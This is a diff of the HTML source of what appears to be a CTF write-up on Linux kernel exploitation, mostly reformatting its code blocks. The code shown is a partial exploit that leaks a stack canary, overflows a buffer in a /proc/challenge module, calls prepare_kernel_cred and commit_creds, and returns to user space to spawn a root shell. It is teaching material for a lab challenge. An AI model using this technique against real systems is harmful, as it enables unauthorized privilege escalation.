@@ -33,28 +33,28 @@ __asm__(
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
-&lt;pre>&lt;code>void load_user_space(unsigned long target)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
 {
-/* return to user-space */
+&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
 __asm__(
-&amp;quot;.intel_syntax noprefix;&amp;quot;
-&amp;quot;swapgs;&amp;quot;
-&amp;quot;mov r15, save_ss;&amp;quot;
-&amp;quot;push r15;&amp;quot;
-&amp;quot;mov r15, save_sp;&amp;quot;
-&amp;quot;push r15;&amp;quot;
-&amp;quot;mov r15, save_rf;&amp;quot;
-&amp;quot;push r15;&amp;quot;
-&amp;quot;mov r15, save_cs;&amp;quot;
-&amp;quot;push r15;&amp;quot;
-&amp;quot;mov r15, %[rip];&amp;quot;
-&amp;quot;push r15;&amp;quot;
-&amp;quot;iretq;&amp;quot;
-&amp;quot;.att_syntax;&amp;quot;
-: [rip] &amp;quot;=&amp;amp;r&amp;quot; (target)
+&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
+&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
 );
 }
-&lt;/code>&lt;/pre>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
 &lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
@@ -62,7 +62,8 @@ __asm__(
 &lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
 &lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
 &lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
 {
 &lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
 __asm__(
@@ -84,18 +85,19 @@ load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/s
 {
 &lt;span style="color:#75715e">// ...
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>}
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
 {
 &lt;span style="color:#75715e">// ...
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>}
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="putting-it-all-together">Putting it All Together&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
-&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
 {
 system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
 {
 save_user_space();
 &lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
@@ -106,7 +108,8 @@ printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;s
 overflow_buffer(fd, canary);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
 }
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="6" type="checkbox" checked />
 &lt;label for="6">
@@ -198,7 +201,8 @@ return 0;
 &lt;/div>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
-&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # insmod challenge.ko
+&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+&lt;pre>&lt;code>/ # insmod challenge.ko
 / # su ctf
 / $ /home/ctf/exploit
 ...
